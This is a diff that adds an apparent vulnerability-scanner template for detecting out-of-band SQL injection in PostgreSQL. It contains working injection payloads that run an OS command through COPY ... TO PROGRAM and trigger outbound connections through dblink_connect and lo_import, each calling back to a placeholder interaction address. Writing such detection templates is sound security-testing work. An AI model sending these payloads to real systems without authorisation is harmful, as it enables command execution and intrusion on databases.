@@ -1,0 +1,44 @@
+id: "sqli-oob-postgresql"
+issue_code: sql_injection
+detection_condition: or
+detection_methods:
+  - oob_interaction:
+      oob_address: "{{.oob_address}}"
+      confidence: 95
+  - response_check:
+      check: database_error
+      confidence: 85
+vars:
+  - name: oob_address
+    value: "{{interactionAddress}}"
+launch:
+  operator: or
+  conditions:
+    - type: platform
+      value: postgresql
+    - type: platform
+      value: python
+    - type: platform
+      value: ruby
+    - type: scan_mode
+      value: fuzz
+templates:
+  # COPY TO PROGRAM - Most reliable (requires superuser or pg_execute_server_program role)
+  - "'; COPY (SELECT '') TO PROGRAM 'nslookup {{.oob_address}}'--"
+  - "1'; COPY (SELECT '') TO PROGRAM 'nslookup {{.oob_address}}'--"
+  - "'); COPY (SELECT '') TO PROGRAM 'nslookup {{.oob_address}}'--"
+  
+  # dblink extension (if installed)
+  - "'; SELECT dblink_connect('host={{.oob_address}} port=80 dbname=test')--"
+  - "' UNION SELECT dblink_connect('host={{.oob_address}} port=80 dbname=test')--"
+  
+  # Large object functions (Windows UNC)
+  - "'; SELECT lo_import('\\\\{{.oob_address}}\\a')--"
+categories:
+  - sql_injection
+  - oob
+  - postgresql
+platforms:
+  - postgresql
+  - python
+  - ruby
